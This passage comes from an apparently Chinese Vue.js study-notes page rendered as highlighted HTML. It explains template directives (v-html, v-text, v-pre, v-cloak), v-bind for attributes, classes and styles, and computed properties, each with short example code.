class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;app&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-html</span>=<span class="string">&#x27;url&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">url</span>:<span class="string">&#x27;&lt;a href=&quot;https://www.baidu.com&quot;&gt;百度&lt;/a&gt;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>#### v-text+ 该指令和Mustache比较相似：都是用于将数据显示在界面中+ 该指令通常情况下，接收一个string类型<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;app&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123; message &#125;&#125; vuejs<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>  <span class="comment">&lt;!-- hello vuejs --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-text</span>=<span class="string">&#x27;message&#x27;</span>&gt;</span>vuejs<span class="tag">&lt;/<span class="name">h2</span>&gt;</span> <span class="comment">&lt;!-- hello --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>:<span class="string">&#x27;hello&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>#### v-pre+ 用于跳过这个元素和它子元素的编译过程，用于显示原本的Mustache语法<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;app&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-pre</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span> <span class="comment">&lt;!-- &#123;&#123; message &#125;&#125; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">           <span class="attr">message</span>:<span class="string">&quot;hello&quot;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>#### v-cloak+ 某些情况下，浏览器可能会直接显示出未编译的Mustache标签+ cloak（斗篷）+ 在vue解析之前，div中有一个属性v-cloak+ 在vue解析之后，div中没有一个属性v-cloak<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-attr">[v-cloak]</span>&#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">display</span>:none;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;app&#x27;</span> <span class="attr">v-cloak</span>&gt;</span></span><br><span class="line">    &#123;&#123; message &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">el</span>:<span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">message</span>:<span class="string">&#x27;hello&#x27;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>## 2.v-bind动态绑定(p14-19)### 2.1 v-bind绑定基本属性+ 前面学习的指令主要作用是将值插入到我们的<font color='red'>模板的内容</font>中+ 除了内容需要动态决定外，某些属性也希望能动态绑定+ 该指令v-bind：  + 作用：动态绑定属性  + 缩写：`:`  + 预期：any（with argument）| Object（without argument）  + 参数：attrOrProp（optional）<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;app&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;&#123;&#123;imgsrc&#125;&#125;&#x27;</span>&gt;</span>  <span class="comment">&lt;!-- 直接将&#123;&#123;imgsrc&#125;&#125;赋值给src了 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;imgsrc&#x27;</span>&gt;</span> <span class="comment">&lt;!-- 同上理 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:src</span>=<span class="string">&#x27;imgsrc&#x27;</span>&gt;</span> <span class="comment">&lt;!-- 这样才会解析vue中的imgsrc --&gt;</span>、</span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">:src</span>=<span class="string">&#x27;imgsrc&#x27;</span>&gt;</span>  <span class="comment">&lt;!-- 语法糖 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>### 2.2 v-bind动态绑定class（对象语法）对象语法的含义是：class后面跟的是一个对象+ **用法一：直接通过`&#123;&#125;`绑定一个类**<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">:class</span>=<span class="string">&quot;&#123;&#x27;active&#x27;:isActive&#125;&quot;</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>+ **用法二：可以通过判断，传入多个值**<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">:class</span>=<span class="string">&quot;&#123;&#x27;active&#x27;:isActiven,&#x27;line&#x27;:isLine&#125;&quot;</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>+ **用法三：和普通的类同时存在，并不冲突**<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;&#123;&#x27;active&#x27;:isActiven,&#x27;line&#x27;:isLine&#125;&quot;</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>+ **用法四：如果过于复杂，可以放在一个methods或者computed中**<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;classes&quot;</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h2</span>&gt;</span> <span class="comment">&lt;!-- classes是一个计算属性 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;app&#x27;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;h2 v-bind:class=&quot;&#123;类名1:boolean, 类名2: boolean&#125;&quot;&gt;&lt;/h2&gt;  --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&#x27;title&#x27;</span> <span class="attr">v-bind:class</span>=<span class="string">&quot;&#123;active:isActive,line:isLine&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&#x27;title&#x27;</span> <span class="attr">v-bind:class</span>=<span class="string">&quot;getClasses()&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">isActive</span>:<span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">isLine</span>:<span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">getClasses</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> &#123;<span class="attr">active</span>:<span class="variable language_">this</span>.<span class="property">isActive</span>,<span class="attr">line</span>:<span class="variable language_">this</span>.<span class="property">isLine</span>&#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>### 2.3 v-bind动态绑定class（数组语法）<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&#x27;title&#x27;</span> <span class="attr">:class</span>&quot;[&#x27;<span class="attr">active</span>&#x27;,&#x27;<span class="attr">line</span>&#x27;]&quot;&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span> <span class="comment">&lt;!-- 与class=“title active line” 同 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&#x27;title&#x27;</span> <span class="attr">:class</span>&quot;[<span class="attr">active</span>,<span class="attr">line</span>]&quot;&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span>  <span class="comment">&lt;!-- 此时就是变量 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&#x27;title&#x27;</span> <span class="attr">:class</span>&quot;<span class="attr">getClasses</span>()&quot;&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">active</span>:<span class="string">&#x27;aaa&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">line</span>:<span class="string">&#x27;bbb&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">getClasses</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> [<span class="variable language_">this</span>.<span class="property">active</span>,<span class="variable language_">this</span>.<span class="property">line</span>]</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>### 2.4 v-bind绑定style（对象语法）+ style后面跟的是一个对象类型<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;key(属性名,可以不加&#x27;&#x27;):value(属性值,要加&#x27;&#x27;)&#125;&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;&#x27;font-size&#x27;(或者fontSize、-要加&#x27;&#x27;):&#x27;50px&#x27;(if无&#x27;&#x27;会看作变量报错)&#125;&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;font-size:finalSize(当成变量使用/finalSize2+&#x27;px&#x27;)&#125;&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">:style</span>=<span class="string">&quot;grtStyles()&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">finalSize</span>:<span class="string">&quot;50px&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">finalSize2</span>:<span class="number">100</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">finalColor</span>:<span class="string">&quot;red&quot;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        methods&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">getStyles</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;<span class="attr">fontSize</span>:<span class="variable language_">this</span>.<span class="property">finalSize</span>,<span class="attr">color</span>:<span class="variable language_">this</span>.<span class="property">finalColor</span>&#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;    </span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>### 2.5 v-bind绑定style（数组语法）+ style后面跟的是一个数组类型+ 多个值以‘,’分割 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-bind:style</span>=<span class="string">&quot;[baseStyle,baseStyle2]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">baseStyle</span>:&#123;<span class="attr">color</span>:<span class="string">&quot;red&quot;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">baseStyle</span>:&#123;<span class="attr">fontSize</span>:<span class="string">&#x27;100px&#x27;</span>&#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;  </span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>## 3. 计算属性(p20-25)### 3.1 基本使用<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;firstname + &#x27; &#x27; + lastname&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;firstname&#125;&#125; &#123;&#123;lastname&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;getfullname()&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;fullname&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>  <span class="comment">&lt;!-- 计算属性 是方法 但是也当作属性看 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">firstname</span>:<span class="string">&#x27;lebron&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">lastname</span>:<span class="string">&#x27;james&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">computed</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//当作属性看 所以方法的命名可以是属性的命名</span></span></span><br><span class="line"><span class="language-javascript">            <span class="attr">fullname</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstname</span> + <span class="string">&#x27; &#x27;</span> + <span class="variable language_">this</span>.<span class="property">lastname</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//当作属性看 所以方法的命名可以是属性的命名</span></span></span><br><span class="line"><span class="language-javascript">            <span class="attr">getfullname</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstname</span> + <span class="string">&#x27; &#x27;</span> + <span class="variable language_">this</span>.<span class="property">lastname</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>### 3.2 复杂操作<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>书的总价 &#123;&#123;totalprice&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">books</span>:[</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>:<span class="number">11</span>,<span class="attr">name</span>:<span class="string">&quot;红宝书&quot;</span>,<span class="attr">price</span>:<span class="number">119</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>:<span class="number">12</span>,<span class="attr">name</span>:<span class="string">&quot;红宝书2&quot;</span>,<span class="attr">price</span>:<span class="number">100</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>:<span class="number">13</span>,<span class="attr">name</span>:<span class="string">&quot;红宝书3&quot;</span>,<span class="attr">price</span>:<span class="number">95</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>:<span class="number">14</span>,<span class="attr">name</span>:<span class="string">&quot;红宝书4&quot;</span>,<span class="attr">price</span>:<span class="number">45</span>&#125;</span></span><br><span class="line"><span class="language-javascript">            ]</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">computed</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//当作属性看 所以方法的命名可以是属性的命名</span></span></span><br><span class="line"><span class="language-javascript">            <span class="attr">totalprice</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> res = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span> ; i &lt; <span class="variable language_">this</span>.<span class="property">books</span>.<span class="property">length</span> ; i++)&#123;</span></span><br><span class="line"><span class="language-javascript">                    res += <span class="variable language_">this</span>.<span class="property">books</span>[i].<span class="property">price</span></span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> res;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span 